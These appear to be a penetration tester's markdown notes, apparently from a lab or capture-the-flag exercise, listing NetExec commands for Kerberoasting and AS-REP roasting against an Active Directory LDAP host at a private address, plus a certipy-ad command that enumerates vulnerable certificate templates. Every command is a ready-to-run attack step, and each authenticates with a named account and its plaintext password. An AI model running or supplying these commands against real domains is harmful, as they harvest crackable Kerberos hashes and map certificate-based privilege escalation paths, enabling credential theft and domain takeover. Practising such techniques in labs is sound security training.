# Kerberoasting 

```
nxc ldap 192.168.167.30  -u Tracy.White -p 'zqwj041FGX' --kerberoasting output.txt
```
# Asreproasting

```
nxc ldap 192.168.167.30  -u Tracy.White -p ''  --asreproast output.txt
```

```
nxc ldap 192.168.167.30  -u Tracy.White -p 'zqwj041FGX'  --asreproast output.txt
```

# Certificate
```
certipy-ad find -u "TRACY.WHITE" -p 'zqwj041FGX' -dc-ip 192.168.167.30 -stdout -vulnerable
```
